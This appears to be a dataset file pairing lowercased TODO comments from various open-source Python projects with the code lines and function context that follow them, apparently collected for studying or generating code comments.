svg = apply_template(svg, {"maxpoints":maxpoints, "trdn": trdn, "msg":"", "valuemid":"0.5", "timemid":"10s", "datapoints":"","init_max_y": "false", "max_y": 0, "seconds_scale":0, "y_shift": 0, "zero": 0}) # todo templating engine </s> if width and height: svg = svg.replace('height="210" width="610"', 'height="%s" width="%s"' % (height, width)) # todo: switch to templating	plotwh svg = apply_template(svg, {"MAXPOINTS":MAXPOINTS, "TRDN": trdn, "MSG":"", "VALUEMID":"0.5", "TIMEMID":"10s", "DATAPOINTS":"","INIT_MAX_Y": "false", "MAX_Y": 0, "SECONDS_SCALE":0, "Y_SHIFT": 0, "ZERO": 0}) # TODO templating engine else: image_views += 1 return flask.Response(svg,  mimetype= 'image/svg+xml', headers={'Cache-Control': 'no-cache, no-store, must-revalidate', 'Pragma': 'no-cache'})
# todo: build this into a spnego_negtokenresp() </s> resptoken = '\xa1\x15\x30\x13\xa0\x03\x0a\x01\x03\xa1\x0c\x06\x0a\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a'	smb2SessionSetup mechStr = mechType.encode('hex') smbServer.log("Unsupported MechType '%s'" % mechStr, logging.CRITICAL) respSMBCommand['SecurityBufferOffset'] = 0x48 respSMBCommand['SecurityBufferLength'] = len(respToken)
pass # todo </s> def handle_request(self, input):	handle_request
pass # todo </s> def startdtd(self, name, publicid, systemid):	startDTD
# todo ideally this happens a layer higher, but this is a bad </s> return sanitize_html(open(filename).read()).encode('utf-8')	_yield_user_file_content if not from_dataset.creating_job.imported and from_dataset.creating_job.tool_id in trans.app.config.sanitize_whitelist: return open(filename) return open(filename)
# todo remove this sleep to reproduce http://tracker.ceph.com/issues/8107 </s> import time	test_lifecycle self._create(cluster_id, pool_name, pg_num=64) pool_id = self._assert_visible(cluster_id, pool_name)['id'] time.sleep(10) self._update(cluster_id, pool_id, {'pg_num': 128})
# todo: this may be wrong, see ticket #1115 comment:27 and ticket #1784. </s> needs_rebalancing = bool(good_share_hosts < len(verifiedshares))	_format_results recoverable = 0 unrecoverable = 1 cr = CheckResults(self._verifycap, SI, healthy=healthy, recoverable=bool(recoverable),
# todo(vish): do we have to use sql here? </s> session.execute('update security_group set deleted=1')	security_group_destroy_all session = get_session() with session.begin(): session.execute('update security_group_rules set deleted=1')
# todo: implement me </s> if isinstance(other, userlist):	__add__ def __add__(self, other): raise NotImplementedError() return self.__class__(self.data + other.data) elif isinstance(other, type(self.data)):
pass # todo: explain </s> pass	status402 def status402(self):        # Payment Required
# todo: support steps and times (motion blur) </s> luxcore_scene.deleteobject(src_name)	convert transformations = array("f", duplis.matrices) luxcore_scene.DuplicateObject(src_name, dst_name, count, transformations) print("Dupli export took %.3fs" % (time() - start))
raise pathaccesserror()  # todo path </s> elif op == '(':	_target_eval cur = cur[arg] except KeyError, IndexError: args, kwargs = arg cur = Call(cur, args, kwargs)(target)
# todo: act </s> profiles = self.remote.get_profiles(self.token)	test_create_profile def test_create_profile(self): Test: create/edit a profile object profile = self.remote.new_profile(self.token) for field in self.profile_fields:
# todo: change this back to a factory in the instance trait some day </s> self.tick_generator = defaulttickgenerator()	__init__ def __init__(self, component=None, **kwargs): super(PlotAxis, self).__init__(**kwargs) if component is not None:
# todo test </s> self.unconstrained_effect_repertoire(purview))	effect_info return utils.emd(self.effect_repertoire(mechanism, purview),
# todo send the key to the master for approval </s> sh_ = '/bin/sh'	seed bs_ = gather_bootstrap_script() salt.crypt.gen_keys(mpt_tmp, 'minion', 2048) if os.path.isfile(os.path.join(mpt, 'bin/bash')): sh_ = '/bin/bash'
# todo: 判断返回结果，处理异常 </s> print msg	perm_role_delete task = Tasks(recycle_resource) msg = task.del_user(get_object(PermRole, id=role_id).name) key_files = os.listdir(role_key) for key_file in key_files:
capacity_in: tokenamount,  # todo: rename </s> amount_without_fees: paymentwithfeeamount,	mediation_fee_backwards_func balance_in: Balance, balance_out: Balance, cap_fees: bool, ) -> Interpolate:
# todo(b/160795287): deprecate estimator based executor. </s> fn_args_dict = fn_args.get_dict()	run_fn fn_args: Holds args used to train the model as name/value pairs. schema = io_utils.parse_pbtxt_file(fn_args.schema_file, schema_pb2.Schema()) fn_args_dict['serving_model_dir'] = os.path.join(fn_args.model_run_dir, path_utils.SERVING_MODEL_DIR)
raise notimplementederror  # todo </s> def read(self, query_function: contractfunction):	read
msg="your scan id is not valid!"  # todo: add to message() </s> )	get_result_content structure( status="error", ), 400 return get_scan_result(scan_id)
# todo: abstract into function to avoid repetition with `import_`. </s> click.echo("importing checkpoint... ", nl=false)	download shutil.copyfileobj(response.raw, f) click.echo('done.') output = os.path.join(LUMINOTH_PATH, CHECKPOINT_PATH, checkpoint['id']) with tarfile.open(path) as f:
# todo: avoid dummy and generate func here when inlining is possible </s> def _impl(df, n=5):	_impl return hpat.hiframes.pd_dataframe_ext.head_dummy(df, n)
# todo fix. </s> self.assertequals(reil_ctx_out["mm0"], res)	test_por_1 res = ctx_init["mm0"] | ctx_init["mm1"] x86_ctx_out, reil_ctx_out = self.__run_code(asm, 0xdeadbeef, ctx_init) self.assertEquals(reil_ctx_out["mm1"], ctx_init["mm1"])
geth_process.start()  # todo: graceful shutdown </s> geth_process.wait_for_ipc(timeout=30)	ursula raise click.BadOptionUsage(option_name="--geth", message="Federated only cannot be used with the --geth flag") geth_process = NuCypherGethDevnetProcess(password=password, config_root=config_root)  # TODO: Only devnet for now provider_uri = f"ipc://{geth_process.ipc_path}" ursula_config.node_process = geth_process
# todo temporary, try to stay compatible with rest of the code </s> top = self._windows[-1]	close window.close() if self._windows: self._mainmenu.current = top if hasattr(top, 'on_escape'):
assert r.status == 200  # todo: other codes </s> rs = httpresponse.from_json(r.data.decode("utf-8"))	rollback self.transactions.remove(tx) r = self._delete("/db/data/transaction/%s" % tx) rs.audit()
# todo: the zip contains actors.xml and banners.xml, which are currently ignored [gh-20] </s> log().debug("we recived a zip file unpacking now ...")	_loadUrl if 'application/zip' in resp.headers.get("Content-Type", ''): try: zipdata = StringIO.StringIO() zipdata.write(resp.content)
# todo: parlist, dots, block </s> self.assertequal(6, p._pos)	testFuncBodyEmptyParList self.assertIsNotNone(node)
# todo(jflesch): instantiate an actionxxx to do that, so </s> target_doc.steal_page(obj)	__on_match_list_drag_data_received_cb print ("[doc list] drag-data-received : %s -> %s" % (obj_id, target_doc.docid)) if obj.doc.nb_pages <= 0: del_docs = [obj.doc]
# todo: figure out if we are clobbering the tests by this </s> if not data:	test_talib_with_default_params talib_data = dict() data = zipline_transform.window continue for key in ['open', 'high', 'low', 'volume']:
# todo: check entity headers </s> if ('gzip' in self.response.parsed_hdrs.get(name, [])) == \	range_done def range_done(range_response): if range_response.status == '206': ('gzip' not in range_response.parsed_hdrs.get(name, [])): self.setMessage('header-%s header-content-encoding' % rs.RANGE_NEG_MISMATCH)
# todo: find a more robust way of checking that the coefficients are indeed </s> if base_ring not in rings() or not rdf.has_coerce_map_from(base_ring):	Polyhedron base_ring = base_ring.fraction_field() convert = True raise ValueError("invalid base ring") if base_ring is RR:
# todo: should changes to draft versions of studies be logged? </s> study.delete_file(file)	dataverse_delete_file file = study.get_file_by_id(file_id)
irregular_dim_names = ['time', 't']  # todo: use irregular flag from database instead </s> result['irregular_dims'] = dict((dim, example[dim].values)	get_result_stats 'result_max': tuple(to_single_value(example[dim].max()) for dim in example.dims), } for dim in example.dims if dim in irregular_dim_names) return result
# todo : pytest.mark.parametrise once nose is gone. </s> assert pretty.pretty(obj) == expected	test_collections_counter for obj, expected in cases:
# todo: this should be handled by command_start </s> os.unlink(pid_file)	run stderr('Warning: Disconnected. Reconnecting in %s seconds...' % delay) time.sleep(delay) os._exit(0)
# todo(lyarwood): merge this into _build_server </s> server['block_device_mapping_v2'] = [{	test_nonbootable_metadata_bfv_image_metadata image_uuid='', networks='none' ) 'source_type': 'image', 'destination_type': 'volume',
# todo: the following skipped suite and fixtures should be enabled </s> return ['api-key']	_filter_headers def _filter_headers(self):
"""todo doc me""" </s> from .storage import consolidatedmetadatastore	open_consolidated def open_consolidated(store, metadata_key='.zmetadata', mode='r'): store = normalize_store_arg(store) if mode not in 'ra':
# todo: if the main thread receives a signal and we have no timeout, we </s> io_events = poller.poll(timeout)	WaitForSocketCondition try: while True: if not io_events: return None
#todo finish me </s> user_settings.access_key = 'to-kill-a-mocking-bucket'	test_s3_remove_user_settings user_settings = AddonS3UserSettings()
#todo: cascades need handling. </s> if synchronize_session not in [false, 'evaluate', 'fetch']:	delete collations between the database and Python. Warning - this currently doesn't account for any foreign key/relation cascades. raise sa_exc.ArgumentError("Valid strategies for session synchronization are False, 'evaluate' and 'fetch'") context = self._compile_context()
# todo: perhaps support parallel effects, as long as all the child effects </s> if type(effect) is not effect:	resolve_stubs a non-stub intent is returned, and return that value. This should probably be your most commonly used unit testing function. raise TypeError("effect must be Effect: %r" % (effect,)) while type(effect) is Effect:
# todo: does this work/handle already being logged out/logged in deep ok? </s> self.logout()	destroy def destroy(self): if self.session_type == 'bash': elif self.session_type == 'vagrant': self.logout()
# todo: make sure we do not pass ngons with more than 4 versices to zbrush </s> me = obj_temp.data	exportGoZ me = obj_temp.to_mesh(bpy.context.depsgraph, apply_modifiers=True, calc_undeformed=False) else: me.calc_loop_triangles() if pref.flip_y:
# todo: check for field </s> remote_model = prop.rel_model	create_ajax_loader if prop is None: raise ValueError('Model %s does not have field %s.' % (model, field_name)) remote_fields = [] for field in fields:
# todo: log exception </s> return none	scan client = sshconnect(host, port=port, username=user, key_filename=conf["key"]) except Exception as e: for item in filelist: cmd = cmdline[:]
# todo not portable, redo. </s> return	test_exploration_with_discrete_action_space def test_exploration_with_discrete_action_space(self): action_space = IntBox(5, shape=(2, 2), add_batch_rank=True) distribution = Categorical()
# todo check width & height is in self.available modes </s> return stream_profile.width(), stream_profile.height()	Realsense2_Source try: stream_profile = self.stream_profiles[rs.stream.depth] except AttributeError: return self.depth_frame_size_backup
# todo(solitude): remove this. </s> else:	paypal_setup_bounce result = client.post_permission_url(data={'scope': perms, 'url': url}) paypal_url = result['token'] paypal_url = paypal.get_permission_url(addon, dest, perms) return jingo.render(request,
# todo add negative sampling? </s> l1 += dot(ga, l2a)  # learn input -> hidden	train_sentence_sg ga = (1 - word.code - fa) * alpha  # vector of error gradients multiplied by the learning rate model.syn1[word.point] += outer(ga, l1)  # learn hidden -> output return len([word for word in sentence if word is not None])
return none  # todo better error handling here </s> session_dict = response.json()	get_authenticated_user except Exception, e: log.error(e) if u'error' in session_dict: log.error("Error when getting authenticated user: %s" % session_dict['error'])
# todo: need to change for 2.0 </s> tr = typereduce()	_create_ else: raise LookupError('Unable to find swagger version') s.scan(route=[FixMinMax(), tr]) setattr(app, '_' + kls.__name__ + '__m', ScopeDict(tr.model))
# todo: this can be removed for cartopy > 0.14.3 </s> if hasattr(self.ax, 'projection') and 'transform' in kwargs:	plot_barb if self.barbs: self.barbs.remove() trans = kwargs['transform'] try:
# todo fuck. do i really need to split myself?? </s> for chunk in ichunks(_load_locations(fo), 10000):	save_locs table = sa.table('locations', *schema) with Path('/L/tmp/loc/LocationHistory.json').open('r') as fo: engine.execute(table.insert().values(chunk))
# todo: support steps and times (motion blur) </s> print("dupli export took %.3fs" % (time() - start))	create_session transformations = array("f", duplis.matrices) luxcore_scene.DuplicateObject(src_name, dst_name, count, transformations) engine.update_progress(index / len_objs)
# hack to support saving/loading pytorch models. todo: improve </s> if hasattr(layer, "_model") and not isinstance(layer._model, model):	from_bytes i = 0 for layer in queue: layer.from_bytes(weights[i]) i += 1
#ack = self.serialport.read() # todo: use ack </s> self.sendcommand(141) # 10001101	enable def enable(self):
#@todo: remove in 0.4.10 </s> if reason:	abort def abort(self, reason=""): Abort and give reason self.pyfile.error = encode(reason) raise Abort
# todo check output </s> obj_name = os.path.basename(obj_file)	_test_obj self.assertTrue(len(listing) >= 1) self.openio('container show ' + self.CONTAINER_NAME) opts = self.get_opts(OBJ_HEADERS) output = self.openio('object create ' + self.CONTAINER_NAME +
# todo: xmlhttp.onreadystatechange = self.onreadystatechange </s> xmlhttp.send('')	asyncGetImpl xmlHttp.open("POST", url) xmlHttp.setRequestHeader("Content-Type", "text/plain charset=utf-8") return True
# todo: axis, skipna, and many arguments should be implemented. </s> ).collect()[0][0]	all (F.count(F.when(col.cast('boolean'), 1).otherwise(None)))
# todo: check ping response </s> self.asserttrue(self.packet_outs_from_flows(echo_replies))	icmp_ping_controller 'ipv4_dst': '10.0.0.254', 'echo_request_data': bytes('A'*8, encoding='UTF-8')})
# todo implement </s> return cm	apply_cut cm[i][j] = 0
# todo: yeah, parametrize the user here -w. werner, 2020-07-07 </s> def test_when_list_upgrades_is_provided_a_user_it_should_be_passed_to_the_version_command(	test_when_list_upgrades_is_provided_a_user_it_should_be_passed_to_the_version_command self, ):
#todo: find a better name... </s> def fill_broker_with_scheduler_links(self, broker):	Realm broker.cfg['reactionners'][r.id] = cfg print "***** Broker Me %s got a poller/reactionner link : %s and %s" % (broker.get_name(), broker.cfg['pollers'], broker.cfg['reactionners']) print "DBG: filling broker", broker.get_name() broker.cfg['schedulers'] = {}
# todo: remove when #980 has been merged </s> info.update(formats[-1])	_real_extract 'thumbnail': meta['thumbnail'], } return info
# todo: tree should listen to chief controller </s> ctrl = creator_or_setter(*dlg.get_value())	_show_import_editor_dialog dlg = dialog(self._controller.datafile, item=item) if dlg.ShowModal() == wx.ID_OK: ctrl.set_comment(dlg.get_comment()) self._update_tree(ctrl)
# todo: do not duplicate seqno here </s> txn_data = deepcopy(txn_data)	prepare_revoc_reg_entry_for_state assert seq_no assert txn_time txn_data[f.SEQ_NO.nm] = seq_no txn_data[TXN_TIME] = txn_time
# and the port number made available for re-use. todo: examine the </s> d.addcallback(self.stall, 1.0)	bounce_client c = self.clients[num] d = c.disownServiceParent() def _stopped(res): new_c = client.Client(basedir=self.getdir("client%d" % num))
# todo: deprecated - remove in version 0.10 </s> def test_deprecated_use_of_train(tmpdir, default_domain):	test_deprecated_use_of_train training_data_file = 'examples/moodbot/data/stories.md' agent = Agent("examples/moodbot/domain.yml",
# todo find a better way to set up these defaults </s> args.libraries = []	test_library_update init_logging(False, False) cm = init_coremanager(conf, []) with caplog.at_level(logging.INFO): update(cm, args)
# todo: abstract and require implementation? </s> return self.files.new_key(jobstoreid)	_newKey def _newKey(self, jobStoreID):
# todo: how to check it? meybe we can omit this test </s> pass	test_gausianfill def test_gausianfill():
# todo: remove in v1.2 </s> if len(params) > 0:	fit ----- If X is not a C-ordered contiguous array it is copied. warnings.warn( "Passing additional keyword parameters has no effect and is "
# todo: remove all elements of the list and remove the allowlist </s> allowlist = [	test_no_private_tf_api def test_no_private_tf_api(): "tensorflow_addons/optimizers/novograd.py", "tensorflow_addons/optimizers/moving_average.py",
# todo: cache this result so multiple failing calls don't keep hitting the db </s> return none	sql_product self._sql_product = SQLProduct.objects.get(domain=self.domain, product_id=self.entry_id) except ObjectDoesNotExist: return self._sql_product
# todo: may test file contents </s> temp = tempfile.namedtemporaryfile(delete=false)	test_export_to_csv_filename def test_export_to_csv_filename(self): self.files_to_delete.append(temp.name) rows.export_to_csv(utils.table, temp.name)
# todo: implement auto-dtype method in general parameters </s> zlp.data = zlp.data.astype('float32')	extract_zero_loss_peak E = Eaxis.axis zlp.data[td < E] = 0 return zlp else:
# todo: figure out how to parametrize this on formats, too </s> for fmt in ('{:04d}-w{:02d}-{:d}', '{:04d}w{:02d}{:d}'):	test_isoweek_day ]) def test_isoweek_day(isocal, dt_expected): dtstr = fmt.format(*isocal) assert isoparse(dtstr) == dt_expected
# note this may download autodock vina... </s> vpg = dc.dock.vinaposegenerator(	test_pocket_vina_poses protein_file = os.path.join(current_dir, "1jld_protein.pdb") ligand_file = os.path.join(current_dir, "1jld_ligand.sdf") detect_pockets=True, exhaustiveness=1) protein_pose_file, ligand_pose_file = vpg.generate_poses(
# todo ... </s> self.error("preprocessor: if-evaluation not yet implemented; cannot check '" + condstr + "'")	cpreprocess_evaluate_cond def cpreprocess_evaluate_cond(state, condstr): return True # may be more often what we want :P
# todo: probaby need to keep priority in callee kernel </s> priority=instruction.priority,	_inline_call_instruction id=insn_id[insn.id], within_inames=within_inames, depends_on=depends_on, tags=insn.tags | instruction.tags,
# todo: add examples </s> return self[i]	set_comp r""" Return the `i`-th homogeneous component for assignment.
#todo raise error or others </s> return	on_backup_button_clicked if sterror: log.error(sterror) dirlist = stdout.split() dirlist.sort()
annot.annotation_metadata.annotator.email = "todo" #todo </s> levels = ["function", "large_scale", "small_scale"]	fill_annotation annot.annotation_metadata.origin = metadata[1] annot.annotation_metadata.annotator.name = metadata[annotation_id + 2] [parse_annotation_level(annot, path, annotation_id, level) \ for level in levels]
# todo: check if "class" in current line, add class name </s> txt = txt.replace("protected ", "")	java2pythonlinebyline txt = count * ' ' + txt[count+1:] if txt[count:].startswith("protected ") >= 0: if txt[count:].startswith("public ") >= 0: txt = txt.replace("public ", "")
# todo(emilon): torrentmigrator64 shouldn't upgrade the database </s> migrator = torrentmigrator64(self.session, self.db, status_update_func=self.update_status)	check_and_upgrade self._upgrade_18_to_22() if self.db.version == 22: migrator.start_migrate() if self.db.version == LATEST_DB_VERSION:
# todo: cache the list of relations up front, and then we </s> max_results=0)	list_relations all_tables = client.list_tables( bigquery_dataset, relation_types = { 'TABLE': 'table',
1  # todo: fill in identifier </s> ) # replenishes tokens in the address0	test_netting direct_transfer1 = channel1.create_directtransfer( transfer_amount1, direct_transfer1.sign(privatekey1, address1) direct_transfer1_data = str(direct_transfer1.packed().data)
# todo: handle timeout </s> datareceived = self.read(timeout)	sendReceive self.write(data) while stopWaitingResponse is False: ipHeaderLen = (dataReceived[0] & 15) * 4 portSrcRx = (dataReceived[ipHeaderLen] * 256) + \
# todo: switch to: </s> self.change_track(tl_track)	next tl_track = self.core.tracklist.next_track(self.current_tl_track) if tl_track: else: self.stop(clear_current_track=True)
pass # todo(denero) implement </s> def test_valid_student_submission(self):	test_valid_student_submission
# todo use left / right constants instead of bitmasks </s> if not value in [lcd_entryshiftdecrement, lcd_entryshiftincrement]:	_set_display_shift_mode def _set_display_shift_mode(self, value): raise ValueError('Invalid display shift mode.') self._display_shift_mode = value
# todo eval hook </s> return f	__mcqa_reader mcqa_readers.setdefault(f.__name__, f) eval_hooks.setdefault(f.__name__, XQAEvalHook)
# todo: remove all elements of the list and remove the allowlist </s> allowlist = [	test_no_deprecated_v1 def test_no_deprecated_v1(): "tensorflow_addons/text/skip_gram_ops.py", "tensorflow_addons/metrics/tests/f_scores_test.py",
return self.__parameters.copy()  # todo deep copy, test </s> def get_params(self, deep=true):	get_params
# todo: catch exepction and return true/false on success/error </s> if self.devout is none:	OpenOutput def OpenOutput( self, midi_id ): self.devOut = midi.Output( midi_id, 0, MIDI_BUFFER_OUT )
# todo(cutwater): replace `.decode('utf-8')` call with subprocess </s> tag_info = subprocess.check_output([	get_git_version :raises RuntimeError: If cannot determine git version string. try: 'git', 'describe', '--always', '--match', TAG_PREFIX + '*'] ).decode('utf-8').strip()
# todo : pytest.mark.parametrise once nose is gone. </s> def test_collections_defaultdict():	test_collections_defaultdict a = defaultdict() a.default_factory = a
# todo manage tangent? </s> translation_keyframe = conversion.loc_gltf_to_blender(values[idx * 3 + 1])	parse_translation_channel for idx, key in enumerate(keys): if animation.samplers[channel.sampler].interpolation == "CUBICSPLINE": else: translation_keyframe = Conversion.loc_gltf_to_blender(values[idx])
# todo: cleanup cache files? </s> pass	_cleanup_cache_files def _cleanup_cache_files():
# todo: remove this logging statement when all other todos </s> logger.error("in check_valid, fire is not fully implemented")	check_valid else: raise BattleshipException("invalid state: {}".format(state)) else: raise BattleshipException('invalid action: {}'.format(self._action))
# todo issue #163: remove call to skip_ongoing_request() if it doesn't help. </s> self.skip_ongoing_request()	set_request Set request to coroutine `request` Any positional or keyword arguments are passed to `request` at each call. self._debug_info['request'] = _func_call_str(request, *args, **kwargs) log.debug('Setting new request: %s', self)
# todo: check entity headers </s> if ('gzip' in self.response.parsed_hdrs.get(name, [])) == \	range_done def range_done(range_response): if range_response.status == '206': ('gzip' not in range_response.parsed_hdrs.get(name, [])): self.setMessage('header-%s header-content-encoding' % rs.RANGE_NEG_MISMATCH)
#todo a tester </s> if 'livesportone' in url :	showHosters if aResult: sHosterUrl = aResult[0] url = url.replace('livesportone.com', 'sportes.pw') oRequestHandler = cRequestHandler(url)
# todo - check and if we don't have category, take the only placement that exists in current site </s> self._main_placement = get_cached_object(	main_placement return placements[0] try: Placement, target_ct=ContentType.objects.get_for_model(self.__class__),
self._make_zip(app, ty)     # todo: make this with rq? </s> return send_from_directory(filepath, filename)	get_zip if not self.zip_existing(app, ty): print "OMG this CSV is not existing!!!"
# todo: require an api key on the basic auth header </s> try:	handle_heartbeat @app.route('/api/work_queue/<string:queue_name>/heartbeat', methods=['POST']) def handle_heartbeat(queue_name): heartbeat( queue_name,
# todo: remove when unicode vlens implemented </s> if isinstance(tid, h5t.typestringid) and tid.get_cset() == h5t.cset_utf8 and attr.shape == ():	__getitem__ attr = h5a.open(self._id, self._e(name)) tid = attr.get_type() unicode_hack = True else:
# todo: revise exception taxonomy </s> except exception as e:	_assign_certified_key_info include_info=True) signature["keyid"] = signature["keyid"] or signature["short_keyid"] log.info(e) continue
# todo: keep a childrenbyname dict so we won't have to loop </s> for child in self.children.values():	directoryChangedEvent def directoryChangedEvent(self, childName): if childName: if child.name == childName: childPath = os.path.join(self.path, child.name)
epsilon = 10**(-bpy.data.worlds[0].decimalplaces)  # todo: implement this separately </s> entitiesdict = gutils.epsilontozero({'entities': outputlist}, epsilon, bpy.data.worlds[0].decimalplaces)	exportSMURFsScene sceneinfo += "# created with Phobos " + defs.version + " - https://github.com/rock-simulation/phobos\n\n" outputfile.write(sceneinfo) outputfile.write(yaml.dump(entitiesdict))
# todo: in #5022 </s> if menu_item.linked_object:	get_menu_item_as_dict def get_menu_item_as_dict(menu_item): data = {} data["url"] = menu_item.linked_object.get_absolute_url() else:
# no todo item selected </s> pass	_postpone_selected_item str(self.view.todolist.number(todo)), self._pp_offset + p_pattern)) except AttributeError:
# todo: add exception handling </s> df = pd.dataframe(data)	write_parquet_files listen_count += 1 if len(data['listened_at']) > 0: table = pa.Table.from_pandas(df) pq.write_table(table, filename)
# todo alert? </s> raise runtimeerror("add volttron_agent group failed - prevent "	add_agent_user_group response[0])) if response[1]:
# todo: test this block </s> soup = beautifulsoup(value)	strip_for_head if BeautifulSoup is None: return value [ tag.extract() for tag in list(soup) if not (getattr(tag, 'name', None) in VALID_HEAD_TAGS) ] return str(soup)
# todo: implement </s> pass	init_table_dtz p_data += self.size[2] else:
# todo: are the utf-8 decodes really necessary? </s> rawjs = self._inline_scripts(self.js_paths()).decode("utf-8")	HTMLFileSession rootdir = self.rootdir if js == "inline" or self.inline_js: jsfiles = [] else:
# todo check </s> return self.mimetype	format @interfacedoc def format(self):
# todo: this might be too slow because of the addition </s> data = reduce(lambda res, (key,val): res + int(val)*[key], data.iteritems(), [] )	series data = int(data) if data else 0 elif config.get('compress',False): if config.get('read_cast'): data = map(config.get('read_cast'), data)
# todo: make sure limits are deterministic then update this </s> assert self.viewer.axes.get_ylabel() == 'world 2'	test_hypercube assert self.viewer.state.x_att_world is self.hypercube.id['World 3'] assert self.viewer.state.x_att is self.hypercube.pixel_component_ids[3] assert self.viewer.state.y_att_world is self.hypercube.id['World 2'] assert self.viewer.state.y_att is self.hypercube.pixel_component_ids[2]
# todo: add logger here </s> browser2.quit()	make_screenshot if debug: print("[-] Didn't work with SSLv3 either..." + url) return {"success": None, "error": True} else:
# # todo discuss </s> else:	node_fork_page if node: raise HTTPError(http.FORBIDDEN) node_to_use = project if node_to_use.is_registration:
# todo: how to test the file was added in direct mode? </s> ok_clean_git(dst, annex=true)	test_Dataset_add_to_annex else: assert_false(os.path.islink(filename_abs), "Annexed file is link in direct mode.")
# todo(jay-lau-513) translate the contents to a json stdin </s> out, err = utils.trycmd('echo contents | kubectl', 'create',	pod_create contents.pod_definition_url) else: '-f', '-') if err:
print "returning", len(datapoints), "datapoints"  # todo make sure this is always correct </s> return time_info, datapoints	fetch_multi logger.debug("influx RETURNED  RANGE %d to %d" % ( start_time, end_time))
# todo: attributes should be freed </s> attr = pango.pango_attr_letter_spacing_new(spacing)	add_attr def add_attr(start, end, spacing): attr.start_index, attr.end_index = start, end pango.pango_attr_list_insert(attr_list, attr)
# todo: parse the field contents </s> self.xe_fields.append(xe)	__call__ xe = parse_xe(field.instructions[0][1], log)  # TODO: Handle field with multiple instructions if xe:
# todo will need to go through this for each disjunct, since it does </s> bilinear_map = _bilinear_expressions(model)	_apply_to effectively_discrete_vars = ComponentSet( _effectively_discrete_vars(model, constraint_bound_tolerance)) processed_pairs = ComponentSet() for v1, discrete_constr in effectively_discrete_vars:
#todo remove confirmed, and maybe token, from object </s> verified_emails.append({'address': user.email_verifications[token]['email'],	confirm_user_get except NoResultsFound: user_merge = False 'token': token, 'confirmed': user.email_verifications[token]['confirmed'],
# todo: redundant of advanced panel implementation, very inaccessible here </s> def getwaybackversion(self):	UpdateSoftwareWindow regex = re.compile("commons-(.*)\.") return regex.findall(file)[0] for file in os.listdir(tomcatPath + "/webapps/lib/"): if file.startswith("openwayback-core"):
"""todo doc me""" </s> def values(table):	values
# todo this module is not the module of the param in case of a function </s> pseudo_cls.parent = module	_evaluate_for_statement_string except IndexError: return [] return evaluator.eval_statement(stmt)
# todo: don't produce an expression when used in conditional context </s> expr_type = self.node_type(e)	visit_comparison_expr def visit_comparison_expr(self, e: ComparisonExpr) -> Value: def go(i: int, prev: Value) -> Value: if i == len(e.operators) - 1:
## todo: deinitializer </s> if channel is not none:	exit_function def exit_function(channel): channel.close()
self.current_width = self.current_width * 2 #todo </s> self.current_height = self.current_height * 2 #todo	layer_resize_conv layers.append(nn.ReLU())#TODO self.current_channels = channels return nn.Sequential(*layers)
#todo: check the data! </s> count = 0	test_filtered_multiple_sources pipe_def = self._get_pipe_def("pipe_c1cfa58f96243cea6ff50a12fc50c984.json") p = pipe2py.compile.parse_and_build_pipe(pipe_def, verbose=True) for i in p: count += 1
# todo - retrieve from config </s> timelimit = 2	find_users def find_users (self, criteria, sattrs=None, searchlimit=0, opts=None): If the results are truncated, counter will be set to -1.""" search_fields_conf_str = "uid,givenName,sn,telephoneNumber,ou,title" search_fields = string.split(search_fields_conf_str, ",")
) # todo: translate </s> flash(msg, category="error")	google_error description=error_description, uri=error_uri,
# todo deviations of around 0.5 here from expected values, why? </s> for bb_observed, bb_expected in gen:	test_bounding_boxes_with_keep_size ] gen = zip(observed[0].bounding_boxes, bbs_expected) assert bb_observed.coords_almost_equals( bb_expected, max_distance=1.5)
# todo: check type via docstring </s> checked.append(parameter.parameters)	check_method logger.debug(parameter) assert param is not None ignored = IGNORED_PARAMETERS.copy() if name == 'getUpdates':
# todo: disconnect </s> print("!@# survive after stream.reset()")	Node ) await stream.reset() return hello_mine = self._make_hello_packet()
# todo: what to do if not enough shares, or invalid? </s> return self.pre.combine(shares)	build_rekey :rtype: EncryptedKey :return: EncryptedKey from `shares`
# todo: remove </s> c.pkg = context['package']	history c.pkg_revisions = get_action('package_revision_list')(context, data_dict) except NotAuthorized: abort(401, _('Unauthorized to read package %s') % '')
# todo(eric_k): unicorn@778171fc9546c1fc3d1341ff1151eab379848ea0 doesn't like writing to </s> self.registers -= {'fs'}	__init__ self.registers = set(self._cpu.canonical_registers) self.registers -= self.flag_registers self.registers.add('EFLAGS') for reg in self.registers:
# todo complete this method </s> return guess	get_init_guess guess.append(g)
# todo only do these things if status is true </s> elif endpoint.state == 'unknown':	process status = Actions( endpoint, self.s.sdnc).mirror_endpoint() if self.s.investigations < self.controller['max_concurrent_reinvestigations']: self.s.investigations += 1
# todo: replace xrange (could fail with 32-bit python 2.x). </s> bsl = [self._slice(x, x - step) for x in xrange(start, stop, -step)]	__getitem__ return self._slice(start, stop) else: bsl.reverse() return self.__class__().join(bsl)
#todo(bcwaldon): accomplish this without a type-check </s> if type(data) is list:	_to_xml_node if xmlns: result.setAttribute('xmlns', xmlns) collections = metadata.get('list_collections', {}) if nodename in collections:
# todo currently needed for bcf </s> self.sdnc.mirror_ip(my_ip, messages=messages)	mirror_endpoint self.sdnc.mirror_mac(my_mac, messages=messages) except: self.endpoints.change_endpoint_state(my_hash) self.poseidon_logger.debug(
# todo convert to fit transform </s> x_train_scaled_subset = self.x_train[columns_to_scale]	feature_scaling def feature_scaling(self, columns_to_scale): X_test_scaled_subset = self.X_test[columns_to_scale] scaler = StandardScaler()
#ack = self.serial_port.read() # todo: use ack </s> self.sendcommand(133) # 10000101	SetMotorCW def SetMotorCW(self):
# todo if nothing is found ['rows'] will raise a keyerror </s> data = response['reports'][0]['data']['rows']	get_stats } ).execute() stat_pageviews = [] stat_avgtimeonpage = []
# todo: logging </s> async with self.streams_lock:	Mplex await self._handle_reset(stream_id) else: if stream_id in self.streams: stream = self.streams[stream_id]
#todo: only rebuild static files that changed </s> self._static = none	_rebuild self.listener.pause() try: self.build() except Exception, e:
#todo: manage different in/out styles </s> self.docs['out']['return'] = self.docs['in']['return']	_set_return def _set_return(self): self.docs['out']['rtype'] = self.docs['in']['rtype']
# todo: for dev, store hash of .cpp and .h files on extension build inside version_dev, then when </s> if semvar(self.client_version).version[:2] != server_version[:2]:	_connect self.client_id = self.connection_props['client_id'] server_version = semvar(self.connection_props['server_protocol_version']).version raise RuntimeError('Server and client major/minor version do not match - server is %s and client is %s' % (server_version, self.client_version))
